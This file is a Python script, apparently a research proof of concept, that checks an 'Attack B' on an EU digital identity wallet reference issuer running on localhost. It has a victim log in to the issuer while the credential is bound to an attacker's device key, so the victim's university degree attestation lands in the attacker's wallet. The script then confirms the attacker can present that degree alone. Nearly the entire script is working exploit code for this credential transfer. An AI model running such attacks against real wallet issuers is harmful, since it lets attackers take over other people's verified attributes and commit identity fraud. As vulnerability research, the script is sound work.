#!/usr/bin/env python3
"""End-to-end check for Attack B (issuance-time credential transfer).

Bob (the victim) authenticates to the issuer as himself and runs the whole authorisation
leg; the key-binding proof, however, is signed by Alice's device key. The reference issuer
binds Bob's attribute attestation (a university degree, an EAA) to Alice's key without
checking co-residency. The credential lands in Alice's wallet and Alice can present it
alone, forever, without Bob. That is transfer, not delegation.
"""
import base64, json, sys, urllib.request

API = "http://localhost:4000/api"
DEG_CFG = "urn:eu.europa.ec.eudi:learning:credential:1:dc+sd-jwt-compact"
BOB_SUBJECT = "abianchi"   # Anna Bianchi — the victim whose degree is transferred
DEG_DCQL = {
    "credentials": [{
        "id": "degree", "format": "dc+sd-jwt",
        "meta": {"vct_values": ["urn:eu.europa.ec.eudi:learning:credential:1"]},
        "claims": [{"path": ["date_of_issuance"]}],
    }]
}


def call(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(API + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=120) as r:
        return json.loads(r.read().decode())


def b64url(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def decode_sdjwt(raw):
    """Return (payload dict, [disclosure claim names]) from a compact SD-JWT VC."""
    jwt, *rest = raw.split("~")
    payload = json.loads(b64url(jwt.split(".")[1]))
    names = []
    for d in rest:
        if not d or d.count(".") >= 2:   # trailing KB-JWT (has 3 segments) or empty
            continue
        try:
            arr = json.loads(b64url(d))
            if len(arr) == 3:
                names.append(arr[1])
        except Exception:
            pass
    return payload, names


def main():
    units = call("GET", "/wallet-units")
    alice = units[0]["id"]
    bob = units[1]["id"] if len(units) >= 2 else call(
        "POST", "/wallet-units", {"label": "Wallet unit 2 (Bob, victim)"})["id"]
    alice_key = next((k["thumbprint"] for k in units[0]["keys"] if k["role"] == "device"), "?")
    print(f"Alice (attacker) unit = {alice}  device key {alice_key[:16]}…")
    print(f"Bob   (victim)   unit = {bob}\n")

    print("== Attack B issuance: Bob authenticates, credential bound to Alice's key ==")
    res = call("POST", "/issue", {
        "walletUnitId": bob,               # Bob's wallet runs the authorisation leg
        "username": BOB_SUBJECT,           # Bob authenticates as himself
        "password": "password",
        "credentialConfigurationId": DEG_CFG,
        "bindToWalletUnitId": alice,       # ... but the proof binds to Alice's device key
    })
    print("  status:", res.get("status"), "| stored in unit:", res.get("walletUnitId"),
          "| error:", res.get("error"))
    if res.get("status") != "issued":
        print("FAIL: issuance did not succeed"); return 2

    print("\n== Where did the credential land? ==")
    alice_creds = call("GET", "/credentials?walletUnitId=" + alice)
    bob_creds = call("GET", "/credentials?walletUnitId=" + bob)
    print(f"  Alice holds {len(alice_creds)} credential(s); Bob holds {len(bob_creds)}")
    if not alice_creds:
        print("FAIL: credential not in Alice's wallet"); return 2

    payload, disclosed = decode_sdjwt(alice_creds[-1]["raw"])
    cnf = payload.get("cnf", {}).get("jwk", {})
    print(f"  credential vct: {payload.get('vct')}")
    print(f"  subject on credential (disclosable claims): {disclosed}")
    print(f"  cnf key type/crv: {cnf.get('kty')}/{cnf.get('crv')}  (bound key lives in Alice's unit)")

    print("\n== Alice presents Bob's degree ALONE (Bob not involved) ==")
    pres = call("POST", "/present", {"walletUnitId": alice, "dcqlQuery": DEG_DCQL})
    print("  status:", pres.get("status"), "| error:", pres.get("error"))

    print("\n== Control: can Bob present it? (should not — he never held it) ==")
    try:
        pres_bob = call("POST", "/present", {"walletUnitId": bob, "dcqlQuery": DEG_DCQL})
        print("  Bob present:", pres_bob.get("status"), "| error:", pres_bob.get("error"))
    except Exception as e:
        print("  Bob present raised:", e)

    print("\n== VERDICT ==")
    ok = (res.get("status") == "issued" and res.get("walletUnitId") == alice
          and alice_creds and pres.get("status") == "presented")
    if ok:
        print("PASS: Bob's attribute attestation was issued into Alice's device (bound to Alice's "
              "key) and Alice presented it alone. Issuance-time credential transfer (Attack B).")
        return 0
    print("PARTIAL/FAIL — inspect the output above.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
